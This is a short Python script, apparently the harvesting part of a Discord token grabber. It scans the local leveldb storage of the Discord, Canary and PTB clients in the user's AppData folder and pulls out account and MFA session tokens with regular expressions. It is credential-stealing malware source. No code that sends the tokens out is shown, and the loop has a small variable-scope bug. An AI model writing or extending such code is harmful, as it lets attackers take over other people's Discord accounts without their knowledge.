# Import modules

import os
import re


Roaming = os.getenv('AppData')

Directories = {
	'Discord': Roaming + '\\Discord',
	'Discord Canary': Roaming + '\\discordcanary',
	'Discord PTB': Roaming + '\\discordptb',
}


# Get discord token directory

def Scan(Directory):
	Directory += '\\Local Storage\\leveldb'

	Tokens = []

	for FileName in os.listdir(Directory):
		if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for Token in re.findall(regex, line):
					Tokens.append(Token)

	return Tokens


# Grab Discord token files

def DiscordToken():
	for Discord, Directory in Directories.items():
		if os.path.exists(Directory):
			Tokens = Scan(Directory)

		if len(Tokens) > 0:
			for Token in Tokens:
				return Token
